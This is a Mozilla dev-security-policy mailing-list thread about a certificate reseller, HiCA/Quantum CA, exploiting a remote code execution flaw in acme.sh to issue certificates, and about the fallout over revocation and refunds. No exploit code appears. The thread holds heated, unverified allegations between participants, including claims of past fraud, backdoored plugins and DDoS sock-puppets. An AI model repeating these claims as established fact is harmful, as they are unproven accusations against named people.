unread,Jun 13, 2023, 6:00:45 AM6/13/23Reply to authorSign in to reply to authorForwardSign in to forwardDeleteYou do not have permission to delete messages in this groupCopy linkReport messageShow original messageEither email addresses are anonymous for this group or you need the view member email addresses permission to view the original messageto dev-secur...@mozilla.org, Xiaohui Lam, Amir Omidi (aaomidi), Kurt SeifriedThe final reference should be "3. <https://cabforum.org/wp-content/uploads/CA-Browser-Forum-BR-v2.0.0.pdf>" instead of the 1.8.7 link provided. (It doesn't change the discussion.) My apologies.
James KastenGoogle Trust Services
![Xiaohui Lam's profile photo](//lh3.googleusercontent.com/a-/ALV-UjXwjYUoSPRmYIngDgvm9rT3wSFkhJwa9ouvvTya0DP11yEBXaVo=s40-c)
### Xiaohui Lam

unread,Jun 13, 2023, 7:35:11 AM6/13/23Reply to authorSign in to reply to authorForwardSign in to forwardDeleteYou do not have permission to delete messages in this groupCopy linkReport messageShow original messageEither email addresses are anonymous for this group or you need the view member email addresses permission to view the original messageto dev-secur...@mozilla.org, James Kasten, Xiaohui Lam, Amir Omidi (aaomidi), Kurt SeifriedJames Kasten,

We apologize for the impact of the security incident on GTS.
I want to say that we will not do bad things, but we lack the means of notarization.

But there is a suggestion:
GTS could evaluate to disable pre-authorizations for domain names or IP addresses for the next 90 days, to reduce potential impacts of the incident.
![Levi's profile photo](//lh3.googleusercontent.com/a-/ALV-UjW8eUIb2Z_r_gDSwWsmqxz1m-g0KL0g5DPzqV5hRY_Xl7dl5uU=s40-c)
### Levi

unread,Jun 13, 2023, 3:30:18 PM6/13/23Reply to authorSign in to reply to authorForwardSign in to forwardDeleteYou do not have permission to delete messages in this groupCopy linkReport messageShow original messageEither email addresses are anonymous for this group or you need the view member email addresses permission to view the original messageto dev-secur...@mozilla.org, James Kasten, Xiaohui Lam, Amir Omidi (aaomidi), Kurt SeifriedI think the key to this issue is "Is the CA should take actions to protect their third-party system security under authorized". This problem included the security of the system, public perception of their morality, and compliance issues. HiCA has used the RCE leak of ACME to add advertising to end users (or commercial activities) but as for now, there are not any security problems that destroy the security of CA reported. A few years ago, Quantum CA used the security leak of CA to issue the certificate which expires a period of 5 years, and now, HiCA used the security leak of ACME to add advertising to end users .

In conclusion, there are things we know:
1. There is not any reported security of CA issues (Sectigo, GTS, and more).
2. HiCA used the RCE leak of ACME but has not caused any security problems (as of now).
3. People think the CA must take action to protect the system security (not only for CA's system)
在2023年6月13日星期二 UTC+8 13:00:45<James Kasten> 写道：
![Thomas Zermeno's profile photo](//lh3.googleusercontent.com/a-/ALV-UjV3noErre4w9XBjy78V7QEEunKjd_ZiV7Solw5BjuAIEXrds_Fz=s40-c)
### Thomas Zermeno

unread,Jun 13, 2023, 4:56:41 PM6/13/23Reply to authorSign in to reply to authorForwardSign in to forwardDeleteYou do not have permission to delete messages in this groupCopy linkReport messageShow original messageEither email addresses are anonymous for this group or you need the view member email addresses permission to view the original messageto dev-secur...@mozilla.org, Levi, James Kasten, Xiaohui Lam, Amir Omidi (aaomidi), Kurt SeifriedIn light of the ongoing HiCA discussion, we feel compelled to provide additional clarity on the subject. Not only were we unaware of the existence of HiCA until recently, but we were unaware that QuantumCA was distributing acme.sh. QuantumCA's reseller account was never enabled for ACME therefore no certs were issued from any of QuantumCA branded SubCAs via ACME at any time.

However, SSL.com's free community ACME 90-day certs have been available since 2021 and we have no involvement, collaboration, or control over any ACME client scripts or applications including HiCA's acme.sh. Our courtesy ACME service is available in a similar vein as other free publicly trusted ACME TLS certificate providers with no restrictions or consideration on which ACME clients are allowed access to this service.

We do not collaborate on any projects with our SSL/TLS SubCA resellers other than to provide them brandable certificates. Many members of the community find brandable SubCAs valuable to help build reputation without having to invest in a fully dedicated CA infrastructure, and most reseller customers handle the privilege of their SubCAs responsibly. Unfortunately, there are cases where abuse, intentional or otherwise, may crop up. At SSL.com, we make every effort to respond swiftly and firmly whenever we are alerted of any issues related to our branded SubCAs.

In particular, SSL.com has already planned revocation of the branded SubCAs within the required 7-day time window from the moment we discovered the dissolution of QUANTUM CA LIMITED, in full compliance with our CP/CPS and the CA/B Forum Baseline Requirements. We are also reaching out to individual subscribers affected by this upcoming revocation event to minimize the impact.

Still, there are lessons to learn from this event. Although our CP/CPS stipulates customers’/resellers’ obligation to notify SSL.com of any business registration modification (which includes dissolution), we plan to introduce proactive measures, such as applying periodic reverification of all SubCA resellers' business registrations.

Finally, we view unwarranted statements, which are probably in violation of the [Mozilla Community Participation Guidelines](https://www.mozilla.org/en-US/about/governance/policies/participation/), or individual customer-to-company issues such as “refunds” as off-topic and will directly communicate with the reseller on such matters. We consider dev-security-policy group to be a public Forum to discuss ecosystem-wide security/policy issues and good practices. For example, we could discuss with other CAs to adopt the above-mentioned periodic reverification to further protect the ecosystem.

Thank you,
TomSSL.com

P.S. I have used my Google email address for the m.d.s.p. since 2017. I continued to use it in this public group, after I took on the role of Compliance Manager at SSL.com, as a means to continue the legacy of the account and maintain records of the previous discussions.  Unless otherwise stated, all posts from this address should be considered official replies from SSL.com.![Xiaohui Lam's profile photo](//lh3.googleusercontent.com/a-/ALV-UjXwjYUoSPRmYIngDgvm9rT3wSFkhJwa9ouvvTya0DP11yEBXaVo=s40-c)
### Xiaohui Lam

unread,Jun 13, 2023, 5:59:47 PM6/13/23Reply to authorSign in to reply to authorForwardSign in to forwardDeleteYou do not have permission to delete messages in this groupCopy linkReport messageShow original messageEither email addresses are anonymous for this group or you need the view member email addresses permission to view the original messageto dev-secur...@mozilla.org, Thomas Zermeno, Levi, James Kasten, Xiaohui Lam, Amir Omidi (aaomidi), Kurt SeifriedThomas Zermeno,

>   in full compliance with our CP/CPS and the CA/B Forum Baseline Requirements. We are also reaching out to individual subscribers affected by this upcoming revocation event to minimize the impact.

You mean to get in touch w/ our subscribers to purchase from SSL.com directly in the future? I don't think this is a behave friendly or good reputation of  a CA/Manufacturers to existing/former partners.

There is a proverb called "My customer's customer, isn't my customer".

We stand against poaching our clients, and I'm sure any reseller does too.
![Thomas Zermeno's profile photo](//lh3.googleusercontent.com/a-/ALV-UjV3noErre4w9XBjy78V7QEEunKjd_ZiV7Solw5BjuAIEXrds_Fz=s40-c)
### Thomas Zermeno

unread,Jun 13, 2023, 6:52:14 PM6/13/23Reply to authorSign in to reply to authorForwardSign in to forwardDeleteYou do not have permission to delete messages in this groupCopy linkReport messageShow original messageEither email addresses are anonymous for this group or you need the view member email addresses permission to view the original messageto dev-secur...@mozilla.org, Xiaohui LamBruce,
We want to work with you on notifying the affected parties but we will proceed independently if we have to. We have no intention of "poaching"; we are trying to minimize the impact on those subscribers since the QUANTUM CA LIMITED entity no longer exists.
If you want to assist SSL.com in contacting the affected subscribers, please contact us using the options in <https://www.ssl.com/contact_us/> and we will route your request to the proper department.
Regards,

TomSSL.com

![Watson Ladd's profile photo](//lh3.googleusercontent.com/a-/ALV-UjWlzyQJEz2xwhl8VPnVhVR1xHCkRnRyLxY-rl0wcpcurR0jC1PP=s40-c)
### Watson Ladd

unread,Jun 14, 2023, 4:38:07 PM6/14/23Reply to authorSign in to reply to authorForwardSign in to forwardDeleteYou do not have permission to delete messages in this groupCopy linkReport messageShow original messageEither email addresses are anonymous for this group or you need the view member email addresses permission to view the original messageto Xiaohui Lam, dev-secur...@mozilla.org, Thomas Zermeno, mochaaP, Andrew Ayer, John Han (hanyuwei70)On Sun, Jun 11, 2023 at 6:42 AM Xiaohui Lam <inao...@gmail.com> wrote:

>

> We agree with SSL.com canceling the 90-day certificate customers under Quantum subCA, but we object to the annual customer service payment.

> Should SSL.com refund some of the certificates because they were multi-year subscription certificates purchased?

>

> If not, why not cancel the product purchase entrance for more than 365 days on your website and interface?

>

> It's likely a fraud in business.

That's an interesting word to throw around for someone who has

committed what looks to all the world like a CFAA violation. I'm

struggling to understand why you would think this was acceptable

conduct to use an RCE in issuance, in short running code on sensitive

machines without user consent.

Furthermore the CA business is built on trust. SSL.com is doing the right thing.

Sincerely,

Watson Ladd

> --

> You received this message because you are subscribed to the Google Groups "dev-secur...@mozilla.org" group.

> To unsubscribe from this group and stop receiving emails from it, send an email to dev-security-po...@mozilla.org.

> To view this discussion on the web visit <https://groups.google.com/a/mozilla.org/d/msgid/dev-security-policy/f8c61c43-44df-45af-b809-6692cc13edb0n%40mozilla.org>.

--

Astra mortemque praestare gradatim

![John Liptak's profile photo](//lh3.googleusercontent.com/a-/ALV-UjVdLARqQUXexDHpBdnuGUF8yv30Mfckl59d4xbqxAyPMMzzLg=s40-c)
### John Liptak

unread,Jun 14, 2023, 5:27:20 PM6/14/23Reply to authorSign in to reply to authorForwardSign in to forwardDeleteYou do not have permission to delete messages in this groupCopy linkReport messageShow original messageEither email addresses are anonymous for this group or you need the view member email addresses permission to view the original messageto dev-secur...@mozilla.orgI want to point out that 上海帝熙科技有限公司 (HiCA's entity in China) is operating illegally in China.
This company does NOT have 电子认证服务许可证, 电子认证服务使用密码许可证, and 电子政务电子认证服务批文 issued by the State Cryptography Administration (国家密码管理局).
Moreover, I could not find this company's ICP License (ICP证) on <https://tsm.miit.gov.cn/>, so they cannot do e-commerce in China. They only have ICP beian, which means their websites can NOT be used to earn profits.![Xiaohui Lam's profile photo](//lh3.googleusercontent.com/a-/ALV-UjXwjYUoSPRmYIngDgvm9rT3wSFkhJwa9ouvvTya0DP11yEBXaVo=s40-c)
### Xiaohui Lam

unread,Jun 14, 2023, 6:46:40 PM6/14/23Reply to authorSign in to reply to authorForwardSign in to forwardDeleteYou do not have permission to delete messages in this groupCopy linkReport messageShow original messageEither email addresses are anonymous for this group or you need the view member email addresses permission to view the original messageto dev-secur...@mozilla.org, Watson Ladd, dev-secur...@mozilla.org, Thomas Zermeno, mochaaP, Andrew Ayer, John Han (hanyuwei70), Xiaohui Lam@Watson Ladd,

Again,

We agree [ssl.com](http://ssl.com) to cancel free certificates.
It means there aren't only free certificates we're providing.     But also paid certificates, if only annually(1 year) cert been cancelled it be fine we can take it, but there are many multiple year subscription purchased by our users(including some OV certs).
If you bought something with a period of many years, but delivered it on an annual basis, and the merchant ran away after one year, would you defend your consumer rights?
It should sounds fair to refund remaining subscriptions' fee if cancelled?   Especially we haven't to proof OV or EV is associated with HiCA because the CA's OV/OV won't become issued automatically after domain names been validated.     so HiCA didn't implement them ever.
We agree to revoke free certificates because our integrating on HiCA, certificates provided were only free.   No CA's paid product was integrated ever.
We mean we do not agree no additional proceeding for the subscriptions/(certificates to be issued) more than 1 year after revoked

personal word from me, Mr Ladd, It is recommended not to do serious injuries because that are not gentlemen.  Did you see someone disclose that the server was hacked after run `acme.sh --issue --server [https://acme.hi.cn/directory`](https://acme.hi.cn/directory) on the Internet, or did you get a completely offensive injection code?  We can accept a source code audit of the project w/ full git log and databases binlog if you're willing to bear the cost and we think it's fair because your keyboard swearing didn't pay for anything but electricity so you want to blame please prove it, if exists and we shall keep our ears open.
![Xiaohui Lam's profile photo](//lh3.googleusercontent.com/a-/ALV-UjXwjYUoSPRmYIngDgvm9rT3wSFkhJwa9ouvvTya0DP11yEBXaVo=s40-c)
### Xiaohui Lam

unread,Jun 14, 2023, 6:58:03 PM6/14/23Reply to authorSign in to reply to authorForwardSign in to forwardDeleteYou do not have permission to delete messages in this groupCopy linkReport messageShow original messageEither email addresses are anonymous for this group or you need the view member email addresses permission to view the original messageto dev-secur...@mozilla.org, John LiptakMr John Liptak,

It's not against the regulations, it isn't against CA/B Forum BR or CA's CP & CPS at least.

First, the cryptography license license is mandatory only for CAs (organizations who operate PKI facilities);
Secondly, There are many sole proprietorship (self-employed people) are also selling SSL digital certificates and running their own websites, which is totally unable to enroll ICP Registration License.

And your post is completely weering off topic.![Xiaohui Lam's profile photo](//lh3.googleusercontent.com/a-/ALV-UjXwjYUoSPRmYIngDgvm9rT3wSFkhJwa9ouvvTya0DP11yEBXaVo=s40-c)
### Xiaohui Lam

unread,Jun 14, 2023, 7:04:03 PM6/14/23Reply to authorSign in to reply to authorForwardSign in to forwardDeleteYou do not have permission to delete messages in this groupCopy linkReport messageShow original messageEither email addresses are anonymous for this group or you need the view member email addresses permission to view the original messageto dev-secur...@mozilla.org, Thomas Zermeno, Xiaohui LamOK,
We'll provide a list of domains of certificate which we've already proceeded replaced certificate to sup...@ssl.com from my email br...@quantumca.limited soon.Please do not try to contact the email address and contact number of clients on the list.

: -)
Sincere,Bruce![Watson Ladd's profile photo](//lh3.googleusercontent.com/a-/ALV-UjWlzyQJEz2xwhl8VPnVhVR1xHCkRnRyLxY-rl0wcpcurR0jC1PP=s40-c)
### Watson Ladd

unread,Jun 15, 2023, 1:39:53 AM6/15/23Reply to authorSign in to reply to authorForwardSign in to forwardDeleteYou do not have permission to delete messages in this groupCopy linkReport messageShow original messageEither email addresses are anonymous for this group or you need the view member email addresses permission to view the original messageto Xiaohui Lam, dev-secur...@mozilla.org, Thomas Zermeno, mochaaP, Andrew Ayer, John Han (hanyuwei70)On Wed, Jun 14, 2023 at 10:46 AM Xiaohui Lam <inao...@gmail.com> wrote:

>

> @Watson Ladd,

>

> Again,

>

> We agree [ssl.com](http://ssl.com) to cancel free certificates.

> It means there aren't only free certificates we're providing. But also paid certificates, if only annually(1 year) cert been cancelled it be fine we can take it, but there are many multiple year subscription purchased by our users(including some OV certs).

> If you bought something with a period of many years, but delivered it on an annual basis, and the merchant ran away after one year, would you defend your consumer rights?

If the merchant broke into my home to deliver it, I'd be calling the police.

Sincerely,

Watson Ladd

![Amir Omidi's profile photo](//lh3.googleusercontent.com/a-/ALV-UjWNpuyyZFVdhd7Ze3A1nrzUhTUry3metbGmwAp-eZ8jhCinlgKLEQ=s40-c)
### Amir Omidi

unread,Jun 15, 2023, 2:16:23 AM6/15/23Reply to authorSign in to reply to authorForwardSign in to forwardDeleteYou do not have permission to delete messages in this groupCopy linkReport messageShow original messageEither email addresses are anonymous for this group or you need the view member email addresses permission to view the original messageto Watson Ladd, Andrew Ayer, John Han (hanyuwei70), Thomas Zermeno, Xiaohui Lam, dev-secur...@mozilla.org, mochaaPEmailing on a personal capacity.
If you’re offering to open source the RCE code you were using with this. I’m sure that would be helpful.
It is never acceptable to build a business on top of an RCE. The right move would’ve been to disclose this bug.


> --
>
> You received this message because you are subscribed to a topic in the Google Groups "dev-secur...@mozilla.org" group.
>
> To unsubscribe from this topic, visit <https://groups.google.com/a/mozilla.org/d/topic/dev-security-policy/heXVr8o83Ys/unsubscribe>.
>
> To unsubscribe from this group and all its topics, send an email to dev-security-po...@mozilla.org.
>
> To view this discussion on the web visit <https://groups.google.com/a/mozilla.org/d/msgid/dev-security-policy/CACsn0c%3DjQwd035WhDnWJe-BfrKY8Xfxq0_cKUFHDj2W4oWe6-Q%40mail.gmail.com>.

--
Amir Omidi (he/them)
![Xiaohui Lam's profile photo](//lh3.googleusercontent.com/a-/ALV-UjXwjYUoSPRmYIngDgvm9rT3wSFkhJwa9ouvvTya0DP11yEBXaVo=s40-c)
### Xiaohui Lam

unread,Jun 15, 2023, 7:13:50 AM6/15/23Reply to authorSign in to reply to authorForwardSign in to forwardDeleteYou do not have permission to delete messages in this groupCopy linkReport messageShow original messageEither email addresses are anonymous for this group or you need the view member email addresses permission to view the original messageto dev-secur...@mozilla.org, Amir Omidi, Andrew Ayer, John Han (hanyuwei70), Thomas Zermeno, Xiaohui Lam, dev-secur...@mozilla.org, mochaaP, Watson LaddAmir Omidi

> If you’re offering to open source the RCE code you were using with this. I’m sure that would be helpful.
We're involved to reveal the RCE working code analysis on my blog, before 17, June.And reveal a new reveal unsafe variable injection/pollution problem on ACME.sh v3.0.6 on it.
Opensource repo to RCE one ACME.sh v3.0.5 would take some time, because desensitization for variables&datas, and independence from our main repository(HiCA it's a sub-application in it).

> It is never acceptable to build a business on top of an RCE. The right move would’ve been to disclose this bug.
I didn't realize that this would cause serious security problems in the past(but now i do), I'm not a professional security researcher(I don't understand the RCE standard. The security vulnerabilities I have learned in the past are CSRF, SSRF and the like); so I used it for the domain of `/.well-known/pki-validation` validation out of the idea of building a cool tool(HiCA), a easier to disseminate free certificates to the community.

I now understand it was a mistake, My apologies.
![Xiaohui Lam's profile photo](//lh3.googleusercontent.com/a-/ALV-UjXwjYUoSPRmYIngDgvm9rT3wSFkhJwa9ouvvTya0DP11yEBXaVo=s40-c)
### Xiaohui Lam

unread,Jun 15, 2023, 1:50:15 PM6/15/23Reply to authorSign in to reply to authorForwardSign in to forwardDeleteYou do not have permission to delete messages in this groupCopy linkReport messageShow original messageEither email addresses are anonymous for this group or you need the view member email addresses permission to view the original messageto dev-secur...@mozilla.org, Watson Ladd, dev-secur...@mozilla.org, Thomas Zermeno, mochaaP, Andrew Ayer, John Han (hanyuwei70), Xiaohui LamWatson Ladd,

Are you advising our client to accept deprivation of the remaining 4 years of the certificate w/o CA' evaluation whether it is affected by RCE certificates of them ?
Sorry we dare not make such a suggestion because we are resellers. Nor Akamai's resellers won't if incidents happen.

Sincerely,
Bruce Lam.![inao...@gmail.com's profile photo](//lh3.googleusercontent.com/a-/ALV-UjXwjYUoSPRmYIngDgvm9rT3wSFkhJwa9ouvvTya0DP11yEBXaVo=s40-c)
### inao...@gmail.com

unread,Jun 15, 2023, 10:50:21 PM6/15/23Reply to authorSign in to reply to authorForwardSign in to forwardDeleteYou do not have permission to delete messages in this groupCopy linkReport messageShow original messageEither email addresses are anonymous for this group or you need the view member email addresses permission to view the original messageto John Liptak, dev-security-policy, Thomas Zermeno> >  First, the cryptography license license is mandatory only for CAs (organizations who operate PKI facilities);> You are operating a CRL & OCSP server in China, right?
We never operates the CRL and OCSP responders. But CA does(SSL.com can confirm it). Don’t do the uncertain charge if no evidence. Please provide the wrong information source! Before you provide this malicious fabrication I’ll share no more information on your post anymore.
> > Secondly, There are many sole proprietorship (self-employed people) are also selling SSL digital certificates and running their own websites, which is totally unable to enroll ICP Registration License.
> Just because someone else is doing the same thing doesn't mean it's not illegal.
Cryptography license isn’t required for reselling business. For sure.

>> your post is completely weering off topic.> I'm concerned with SSL.com CP/CPS 5.3.1. It claims "SSL.com verifies the identity and trustworthiness of all personnel, whether as an employee, agent, or an independent contractor, prior to the engagement of such person(s)." > If an independent contractor operates illegally in his/her country, how can he/she be considered trustworthy?
SSL.com didn’t verify the Licenses and Permits. So, there is no association between SSL.com CP/CPS 5.3.1 and conclusion in your words.

---

发自我的iPhone

------------------ Original ------------------**From:** John Liptak <johnli...@gmail.com>**Date:** Fri,Jun 16,2023 4:59 AM**To:** dev-secur...@mozilla.org <dev-secur...@mozilla.org>**Cc:** Thomas Zermeno <madca...@gmail.com>, Xiaohui Lam <inao...@gmail.com>**Subject:** Re: RCE used by Intermediate CA to issue certificates.
>  First, the cryptography license license is mandatory only for CAs (organizations who operate PKI facilities);

You are operating a CRL & OCSP server in China, right?
> Secondly, There are many sole proprietorship (self-employed people) are also selling SSL digital certificates and running their own websites, which is totally unable to enroll ICP Registration License.
Just because someone else is doing the same thing doesn't mean it's not illegal.

> your post is completely weering off topic.
I'm concerned with SSL.com CP/CPS 5.3.1. It claims "SSL.com verifies the identity and trustworthiness of all personnel, whether as an employee,agent, or an independent contractor, prior to the engagement of such person(s)."If an independent contractor operates illegally in his/her country, how can he/she be considered trustworthy?![John Liptak's profile photo](//lh3.googleusercontent.com/a-/ALV-UjVdLARqQUXexDHpBdnuGUF8yv30Mfckl59d4xbqxAyPMMzzLg=s40-c)
### John Liptak

unread,Jun 15, 2023, 11:00:39 PM6/15/23Reply to authorSign in to reply to authorForwardSign in to forwardDeleteYou do not have permission to delete messages in this groupCopy linkReport messageShow original messageEither email addresses are anonymous for this group or you need the view member email addresses permission to view the original messageto dev-secur...@mozilla.org, Thomas Zermeno, Xiaohui Lam![xiaohuilam's profile photo](//lh3.googleusercontent.com/a-/ALV-UjXwjYUoSPRmYIngDgvm9rT3wSFkhJwa9ouvvTya0DP11yEBXaVo=s40-c)
### xiaohuilam

unread,Jun 16, 2023, 9:07:33 AM6/16/23Reply to authorSign in to reply to authorForwardSign in to forwardDeleteYou do not have permission to delete messages in this groupCopy linkReport messageShow original messageEither email addresses are anonymous for this group or you need the view member email addresses permission to view the original messageto Roger M Lambdin, dev-secur...@mozilla.org, John Liptak, Thomas ZermenoYour horner Mozilla PKI Policy team and CA members,

The accusation is fabricated and I have good evidence that bir...@gmail.com and johnli...@gmail.com appearing on this mailing list are new potential detractors with the identity and speech style of [https://github.com/acmesh- official/acme.sh/issues/4675](https://github.com/acmesh-%20official/acme.sh/issues/4675) and DDOS attack criminals <https://hostloc.com/thread-1177834-1-1.html> are highly similar (do not care about technical and industry compliance or even RCE vulnerability itself, rather than trying to discredit a company as credible).

I will introduce some of the origins of these IDs with me.
After Matthew Holt revealed that ACME.sh had an RCE vulnerability and was exploited by HiCA, our 2 Chinese servers and 6 overseas servers were severely attacked by DDOS, and also considered to   so we try to close HiCA to avoid DDOS attacks from affecting our kernel business users (it is web page accepts CSR to issue certificates which registered online, which has nothing to do with ACME in command line).

However, due to DNS cache and other reasons, the attack continued; during this period, we analyzed the logs and switched routes to block a large number of IPs. Later we saw that [acme.hi.cn](http://acme.hi.cn) and [www1.hi.cn](http://www1.hi.cn) had no traffic at all and the attack was still affecting until we saw
- <https://hostloc.com/thread-1177834-1-1.html>
(He tried to call on others to participate in the CC Flood/DDOS website using the webbench tool made by golang, and we believe himself participated)
We contacted the attack source IP ASN owner/ISP: the abuse prevention team of IPXO LLC, and finally blocked the attacker's IP.
![网页捕获_16-6-2023_153756_help.ipxo.com.jpeg](https://groups.google.com/a/mozilla.org/group/dev-security-policy/attach/2e6fc4a7448ec/%E7%BD%91%E9%A1%B5%E6%8D%95%E8%8E%B7_16-6-2023_153756_help.ipxo.com.jpeg?part=0.2&view=1)

When we collected all the evidence and prepared to report the case added a statement on restored [www1.hi.cn](http://www1.hi.cn) website and, the attacker’s settlement new topic came, to compromise
- <https://hostloc.com/thread-1178837-1-1.html>
- <https://hostloc.com/thread-1179012-1-1.html>

The other party expressed their willingness to pay for the part of the bill that we can prove to be related to him due to the loss caused by DDOS. We did not take the next legal action to advocate punishment for the network DDOS attackers because they did pay me:
![1521686900808_.pic.jpg](https://groups.google.com/a/mozilla.org/group/dev-security-policy/attach/2e6fc4a7448ec/1521686900808_.pic.jpg?part=0.1&view=1)
(Note that the memo information of the other party’s remarks is: DDOS attack compensation. To protect the privacy of him we did mosaic)

We thought the matter was over. I had some unanswered questions on twitter just before Matthew Holt's twitter reply. (Forgive the twitter account I registered more than ten years ago that has not been used for a long time and cannot meet the risk control; it took a lot of time to re-register one).

Until this Issues appeared,
- <https://github.com/acmesh-official/acme.sh/issues/4675>

It's hard to imagine such abusive voices in the community and on the dev-security-policy mailing list. Even though it's an accusation we can try to respond to, it's frustrating that this post isn't a technical accusation. And we found an interesting thing:

The issuer ID gzchjz007 of <https://github.com/acmesh-official/acme.sh/issues/4675> is highly similar to the criminal ID gzchenjz of our ddos server!

When I pointed out that their slander is fake, this ID gzchjz007 and gzchenjz stopped acting, but a new ID appeared, and came to this dev-security-policy post. That's why I think they're suspicious:- bir...@gmail.com- johnli...@gmail.com

Because they are Chinese speaking people, but pretend to be non-asian. they made same mistake i did, they replied author only but when i respond they quick reposted one time suspicious
![image.png](https://groups.google.com/a/mozilla.org/group/dev-security-policy/attach/2e6fc4a7448ec/image.png?part=0.6&view=1)

they are obviously Chinese to don't understand two button(“回复全部” and “回复作者”)'s difference, they are very familiar with the Chinese network but pretend to be English nicknames and IDs and to bash competitors., and what is even more unbelievable is that they did not have any maillist participation records before this mailing group.
![image.png](https://groups.google.com/a/mozilla.org/group/dev-security-policy/attach/2e6fc4a7448ec/image.png?part=0.5&view=1)

![image.png](https://groups.google.com/a/mozilla.org/group/dev-security-policy/attach/2e6fc4a7448ec/image.png?part=0.3&view=1)

But if we look up other real industry participants there must be a mail listing included.(i tried lookup, No offenses, Mr Kurt Seifried)![image.png](https://groups.google.com/a/mozilla.org/group/dev-security-policy/attach/2e6fc4a7448ec/image.png?part=0.4&view=1)

I think everyone has the right to accuse because this is freedom, but it doesn't mean that one person can play multiple roles to abuse this dev-security-policy mailing list, besides who're affiliated with the Cybercriminals DDoS Team.

If they are really an industry participant who will not commit the misconception that OCSP and CRL will be operated by resellers, please register an official ID to participate in the discussion. We welcome it, and I believe the community does too. But I am convinced that they are the ones who denial-of-service cyber attacks on our servers, and we have decided to formally prosecute them for criminal acts.

Roger M Lambdin <bir...@gmail.com> 于2023年6月16日周五 14:34写道：
> Dear members.
>
> I have conducted a background check on HiCA administrator Xiaohui Lam and would like to share the following with you. These findings are for reference only, so please evaluate them for yourself.
>
> First, in 2013, Xiaohui Lam hijacked AFF promotions by exploiting vulnerabilities in Aliyun forums, defrauded hostloc members by installing backdoors in Discuz forum plugins, and stole others' social accounts through leaked data from CSDN [^1].
>
> Second, in 2015, Xiaohui Lam exploited a vulnerability in the GlobalSign system to sell a large number of 5-year wildcard certificates, but all certificates were revoked after they were discovered [^2].
>
> I would like to emphasize that these are past actions of HiCA administrators and I do not think he will repeat the same mistakes again. However, these events show that he is not a developer who knows very little about security. In the past, he has been someone who knew how to mine vulnerabilities, exploit them and commit fraud and threats against customers.
>
> Based on the above findings, I believe we need to take the following steps:
>
> 1. Considering that he suggested users to execute his script RCE[^3] with root privileges on his official website, we should send a reminder email to all users who have applied for a certificate, asking them to evaluate whether there is unauthorized code on their machines.
>
> 2. the results of the query found that Mr. Lam has two CAs: HiCA and Quantum CA. the website for registration information about Quantum CA is [acme.hi.cn](http://acme.hi.cn). then we need to confirm whether they are using the same infrastructure and whether Quantum CA also uses RCE to issue certificates [^4].
>
> Mr. Lam has shut down HiCA's infrastructure after he was found to be using RCE, but we still need to do a more detailed assessment.
>
> As a member of the community, I believe transparency and trust are vital to us. I hope Mr. Lam will provide the community with a more complete statement and evidence so that the community can evaluate this incident.
>
> [^1]: [https://web.archive.org/web/20130816004143/http://bbs.aliyun.com/read.php?tid=144441](https://web.archive.org/web/20130816004143/http%3A//bbs.aliyun.com/read.php?tid=144441)[^2]: <https://v2ex.com/t/178503?p=1>
> [^3]: [https://web.archive.org/web/20230325041716/http://www1.hi.cn/docs/getting-started/acme.sh-installation](https://web.archive.org/web/20230325041716/http%3A//www1.hi.cn/docs/getting-started/acme.sh-installation)
> [^4]: <https://www.tianyancha.com/company/5599034293>        <https://www.tianyancha.com/company/3435468365>

![Roger M Lambdin's profile photo](//lh3.googleusercontent.com/a-/ALV-UjXzQN0C23Pefe93Tc96kGBZCPM2rKkkbp-n1kOEX46ovEoF8Q=s40-c)
### Roger M Lambdin

unread,Jun 16, 2023, 4:18:56 PM6/16/23Reply to authorSign in to reply to authorForwardSign in to forwardDeleteYou do not have permission to delete messages in this groupCopy linkReport messageShow original messageEither email addresses are anonymous for this group or you need the view member email addresses permission to view the original messageto dev-secur...@mozilla.org, John Liptak, Thomas Zermeno, Xiaohui LamDear members.

I have conducted a background check on HiCA administrator Xiaohui Lam and would like to share the following with you. These findings are for reference only, so please evaluate them for yourself.

First, in 2013, Xiaohui Lam hijacked AFF promotions by exploiting vulnerabilities in Aliyun forums, defrauded hostloc members by installing backdoors in Discuz forum plugins, and stole others' social accounts through leaked data from CSDN [^1].

Second, in 2015, Xiaohui Lam exploited a vulnerability in the GlobalSign system to sell a large number of 5-year wildcard certificates, but all certificates were revoked after they were discovered [^2].

I would like to emphasize that these are past actions of HiCA administrators and I do not think he will repeat the same mistakes again. However, these events show that he is not a developer who knows very little about security. In the past, he has been someone who knew how to mine vulnerabilities, exploit them and commit fraud and threats against customers.

Based on the above findings, I believe we need to take the following steps:

1. Considering that he suggested users to execute his script RCE[^3] with root privileges on his official website, we should send a reminder email to all users who have applied for a certificate, asking them to evaluate whether there is unauthorized code on their machines.

2. the results of the query found that Mr. Lam has two CAs: HiCA and Quantum CA. the website for registration information about Quantum CA is [acme.hi.cn](http://acme.hi.cn). then we need to confirm whether they are using the same infrastructure and whether Quantum CA also uses RCE to issue certificates [^4].

Mr. Lam has shut down HiCA's infrastructure after he was found to be using RCE, but we still need to do a more detailed assessment.

As a member of the community, I believe transparency and trust are vital to us. I hope Mr. Lam will provide the community with a more complete statement and evidence so that the community can evaluate this incident.

[^1]: [https://web.archive.org/web/20130816004143/http://bbs.aliyun.com/read.php?tid=144441](https://web.archive.org/web/20130816004143/http%3A//bbs.aliyun.com/read.php?tid=144441)[^2]: <https://v2ex.com/t/178503?p=1>
[^3]: [https://web.archive.org/web/20230325041716/http://www1.hi.cn/docs/getting-started/acme.sh-installation](https://web.archive.org/web/20230325041716/http%3A//www1.hi.cn/docs/getting-started/acme.sh-installation)
[^4]: <https://www.tianyancha.com/company/5599034293>        <https://www.tianyancha.com/company/3435468365>
在2023年6月16日星期五 UTC+8 06:00:39<John Liptak> 写道：
![Amir Omidi's profile photo](//lh3.googleusercontent.com/a-/ALV-UjWNpuyyZFVdhd7Ze3A1nrzUhTUry3metbGmwAp-eZ8jhCinlgKLEQ=s40-c)
### Amir Omidi

unread,Jun 16, 2023, 6:07:22 PM6/16/23Reply to authorSign in to reply to authorForwardSign in to forwardDeleteYou do not have permission to delete messages in this groupCopy linkReport messageShow original messageEither email addresses are anonymous for this group or you need the view member email addresses permission to view the original messageto xiaoh...@e.hexdata.cn, John Liptak, Roger M Lambdin, Thomas Zermeno, dev-secur...@mozilla.orgMailing on a personal capacity.

> please register an official ID to participate in the discussion
There has never been a requirement to do this, and it is not acceptable for you to suggest that someone needs to pass some arbitrary barrier before they’re allowed to participate.
Second, you seem to know a lot about cybersecurity, and cyber attacks while also claiming you didn’t realize exploiting an RCE is a big deal.
Furthermore, even though you made an offering (potentially not serious, but you still did make the offer). You’ve found various excuses on why you can’t open source the RCE code.
